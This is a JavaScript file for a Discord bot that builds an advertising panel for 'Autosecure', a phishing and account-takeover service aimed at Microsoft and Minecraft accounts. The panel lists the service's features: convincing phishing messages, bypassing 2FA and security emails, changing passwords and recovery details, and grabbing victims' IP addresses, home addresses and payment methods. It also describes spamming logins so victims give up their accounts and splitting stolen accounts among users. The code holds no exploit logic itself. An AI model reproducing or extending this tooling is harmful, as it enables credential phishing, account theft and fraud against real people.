const { EmbedBuilder } = require('discord.js');

async function featurepanel() {
    try {
        const embed = new EmbedBuilder()
            .setTitle("Autosecure Features")
            .setDescription("The most trusted Autosecure")
            .setColor(13158600)
            .addFields(
                {
                    name: "Phisher",
                    value: "- Multiple verification modes\n- Verifies email\n- Sends convincing messages (can be customized)\n- Bypasses security emails & phonenumbers and auth apps. \n- Stat embeds to view stats of users quickly\n- Anti-spam support\n- If they have OTP disabled, you can set an OAuth link to be sent automatically\n- Ban / kick / unban / blacklist buttons\n- Optional: after verifying, users can be automatically kicked / banned / blacklisted, given a role or sent a custom message"
                },
                {
                    name: "Autosecure",
                    value: "- Disables 2FA\n- Creates a recovery code\n- Changes security email\n- Changes password\n- Removes Windows Hello keys (Zyger exploit)\n- Signs out of all locations\n- Checks Minecraft (Owns MC, username, capes)\n- Provides the SSID\n- Grabs Xbox gamertag \n- Grabs subscriptions\n- Grabs purchases\n- Grabs payment methods\n- Shows Microsoft Points\n- Grabs their IP addresses\n- Shows Original Owner\n- Grab their addresses \n- Change Microsoft info \n- Shows account capes"
                },
                {
                    name: "Optional",
                    value: "- Secure if the account doesn't own MC\n- Disable multiplayer\n- Change primary alias (0, 1 or 2 times) \n- Change Minecraft username\n- Automatically adds Zyger 2FA and enables it\n- Removes all apps / OAuths\n- Checks Hypixel Ban.\n- Changes Xbox Gamertag \n- Remove devices"
                },
                {
                    name: "Claiming",
                    value: "- Full info\n- SSID only\n- Auto-Split: Users will automatically get the split chosen by the owner (ex: 2/3 Full Account | 1/3 SSID), the owner gets the Full account incase the user gets nothing/SSID. \n An unclaimed accounts panel for the owner and and option to automatically claim the accounts to the owner after 1-7 days"
                },
                {
                    name: "How would I use it?",
                    value: "- Using the command `/secure` (Uses either OTP, Recovery Code, MSAUTH or Secret Key)\n- Using the phisher that's built into the bot"
                },
                {
                    name: "Coming",
                    value: "- Get outlook emails and search for games and other valuables."
                },
                {
                    name: "Extra Commands",
                    value: "- `/ssidchecker` (Shows info about an SSID)\n- `/quarantine` (Spam login on Hypixel using an SSID, to make the user give up on the account)\n- `/mail inbox` (Show an email's inbox)\n- `/mail register` (Register a unique email address)\n- `/mail list` (View all your saved & registered emails)\n- `/requestotp` (Send codes to any email bypassing 2FA)\n- `/checkban` (Check if a SSID is banned, if so show ban id)\n- `/appeal` (Automatically appeal security banned SSIDs within 2 minutes)"
                }
            );


        return {
            content: null,
            embeds: [embed],
            attachments: []
        };
    } catch (error) {
        console.error("Error creating feature panel:", error);
        return { 
            content: "❌ Failed to generate feature panel",
            embeds: [],
            attachments: []
        };
    }
}

module.exports = featurepanel;


if (require.main === module) {
    featurepanel()
        .then((msgObject) => {
            console.log("Message Object:", msgObject);
        })
        .catch((error) => {
            console.error("Error:", error);
        });
}